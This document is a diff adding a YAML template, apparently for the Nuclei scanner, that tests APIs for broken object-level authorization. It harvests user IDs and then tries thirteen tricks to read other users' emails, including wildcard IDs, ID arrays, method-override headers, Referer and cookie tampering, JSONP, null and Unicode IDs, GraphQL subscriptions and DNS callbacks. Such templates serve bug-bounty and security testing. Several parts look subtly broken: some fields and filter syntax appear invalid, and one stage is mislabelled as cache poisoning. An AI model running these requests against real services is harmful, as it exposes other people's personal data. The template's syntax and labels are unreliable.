@@ -1,0 +1,256 @@
+id: BOLA-UNIQUE-01
+name: BOLA - Uncommon Vectors (Wildcards, Arrays, Overrides, Cache)
+severity: high
+category: api-security
+metadata:
+  cwe: CWE-639
+  owasp: API1:2023
+  tags: ["bola", "idor", "unique", "bugbounty", "cache", "wildcard"]
+
+requests:
+  # ------------------------------------------------------------
+  # STAGE 1: HARVEST VALID IDS (Baseline)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/profile"
+    matchers:
+      - type: status
+        status: 200
+    extractors:
+      - type: json
+        name: valid_ids
+        json:
+          - '$.[*].id'
+          - '$.data[*].id'
+      - type: json
+        name: own_email
+        json:
+          - '$.email'
+          - '$.user.email'
+    cache_variables:
+      - valid_ids
+      - own_email
+
+  # ------------------------------------------------------------
+  # STAGE 2: WILDCARD / GLOB ID (e.g., /api/user/*)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/*"
+      - "{{BaseURL}}/api/user/all"
+      - "{{BaseURL}}/api/v1/user/any"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - '"email"'
+          - '"name"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 3: ARRAY IN QUERY STRING (e.g., ?ids[]=1&ids[]=2)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user?ids[]={{valid_ids[0]}}&ids[]={{valid_ids[1]}}"
+      - "{{BaseURL}}/api/user?user_ids={{valid_ids[0]}},{{valid_ids[1]}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 4: HTTP VERB OVERRIDE (POST with override GET)
+  # ------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/{{valid_ids[0]}}"
+    headers:
+      X-HTTP-Method-Override: GET
+      Content-Type: application/json
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 5: REFERER-BASED BOLA (Some APIs trust Referer)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/orders"
+    headers:
+      Referer: "{{BaseURL}}/user/{{valid_ids[1]}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        negative: true
+        words:
+          - "{{own_email}}"
+        part: body
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 6: CACHE POISONING (If-Modified-Since)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{valid_ids[0]}}"
+    headers:
+      If-Modified-Since: "Wed, 21 Oct 2015 07:28:00 GMT"
+      Cache-Control: "no-cache"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        negative: true
+        words:
+          - "{{own_email}}"
+        part: body
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 7: JSONP CALLBACK (Bypass CORS and possibly return data)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{valid_ids[1]}}?callback=foo"
+    matchers:
+      - type: word
+        words:
+          - 'foo({"'
+          - '})'
+        part: body
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 8: NULL / EMPTY ID (e.g., /user/null, /user/)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/null"
+      - "{{BaseURL}}/api/user/None"
+      - "{{BaseURL}}/api/user/undefined"
+      - "{{BaseURL}}/api/user/"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 9: CASE SENSITIVITY & UNICODE NORMALIZATION
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{valid_ids[0]|upper}}"
+      - "{{BaseURL}}/api/user/{{valid_ids[0]|lower}}"
+      - "{{BaseURL}}/api/user/{{valid_ids[0]|replace('0','۰')}}"  # Unicode zero
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        negative: true
+        words:
+          - "{{own_email}}"
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 10: WEBSOCKET / GRAPHQL SUBSCRIPTION (if WS endpoint found)
+  # ------------------------------------------------------------
+  # This stage is a placeholder; real WebSocket testing requires a WS client.
+  # For now, we test GraphQL subscription via HTTP (if the server supports it).
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+    headers:
+      Content-Type: application/json
+    raw_body: |
+      {
+        "query": "subscription { userUpdated(id: {{valid_ids[1]}}) { email } }"
+      }
+    matchers:
+      - type: word
+        words:
+          - '"data"'
+          - '"userUpdated"'
+        part: body
+      - type: word
+        negative: true
+        words:
+          - "{{own_email}}"
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 11: MASS BOLA VIA COMMA‑SEPARATED IDS IN POST BODY
+  # ------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/users/batch"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "ids": [{{valid_ids[0]}}, {{valid_ids[1]}}, {{valid_ids[2]}}]
+      }
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - '"email"'
+        part: body
+
+  # ------------------------------------------------------------
+  # STAGE 12: OOB (OUT-OF-BAND) VIA DNS (if ID is used externally)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user/{{interactsh-url}}"
+      - "{{BaseURL}}/api/order/{{interactsh-url}}"
+    matchers:
+      - type: dns
+        domain: "{{interactsh-url}}"
+        part: interaction
+
+  # ------------------------------------------------------------
+  # STAGE 13: BOLA VIA COOKIE (if ID stored in cookie, we modify it)
+  # ------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/dashboard"
+    headers:
+      Cookie: "user_id={{valid_ids[1]}}; session=abc123"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        negative: true
+        words:
+          - "{{own_email}}"
+        part: body
+      - type: word
+        words:
+          - '"email"'
+        part: body
